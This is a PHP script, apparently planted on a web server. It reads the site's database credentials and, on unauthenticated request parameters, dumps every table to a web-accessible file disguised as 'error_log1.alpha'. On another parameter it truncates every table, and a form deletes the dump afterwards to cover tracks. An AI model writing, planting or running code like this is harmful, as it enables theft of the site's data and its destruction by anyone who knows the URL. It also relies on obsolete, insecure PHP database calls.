<?php
ob_start();
 require_once("../../config/config.inc.php");
 $username =$DB["user"];
$password = $DB["pass"];
$hostname = "localhost";
$dbname   =   $DB["dbName"];

 if($_REQUEST['a']==1)
 {
backup_tables('localhost',$username,$password,$dbname);
 }


/* backup the db OR just a table */
function backup_tables($host,$user,$pass,$name,$tables = '*')
{
	
	$link = mysql_connect($host,$user,$pass);
	mysql_select_db($name,$link);
	
	//get all of the tables
	if($tables == '*')
	{
		$tables = array();
		$result = mysql_query('SHOW TABLES');
		while($row = mysql_fetch_row($result))
		{
			$tables[] = $row[0];
		}
	}
	else
	{
		$tables = is_array($tables) ? $tables : explode(',',$tables);
	}
	
	//cycle through
	foreach($tables as $table)
	{
		$result = mysql_query('SELECT * FROM '.$table);
		$num_fields = mysql_num_fields($result);
		
		$return.= 'DROP TABLE '.$table.';';
		$row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
		$return.= "\n\n".$row2[1].";\n\n";
		
		for ($i = 0; $i < $num_fields; $i++) 
		{
			while($row = mysql_fetch_row($result))
			{
				$return.= 'INSERT INTO '.$table.' VALUES(';
				for($j=0; $j<$num_fields; $j++) 
				{
					$row[$j] = addslashes($row[$j]);
					$row[$j] = ereg_replace("\n","\\n",$row[$j]);
					if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
					if ($j<($num_fields-1)) { $return.= ','; }
				}
				$return.= ");\n";
			}
		}
		$return.="\n\n\n";
	}
	
	//save file
	
	$f1='error_log1.alpha';
	
	$handle = fopen($f1,'w+');
	fwrite($handle,$return);
	fclose($handle);
	
	?>
	<a href="<?=$f1?>">1</a>
    
	<?
}


 if($_REQUEST['angel']==1)
 {
	 

mysql_select_db($dbname);
$result_t = mysql_query("SHOW TABLES");
while($row = mysql_fetch_assoc($result_t))
{ 

echo $row['Tables_in_' . $dbname]."  Tracting Process.......";


   mysql_query("TRUNCATE " . $row['Tables_in_' . $dbname]);
   
   echo 'Complete';
   ?><br><?
}

 }
if(isset($_POST['q']))
{
	$file_x = 'error_log1.alpha';

if (file_exists($file_x)) {

    unlink($file_x); // delete it here only if it exists
    echo "The file has been deleted";

} else {
    echo "The file was not found and could not be deleted";
} 
}
?>

<form name="ss" method="post">
    <input name="q" type="submit">
    </form>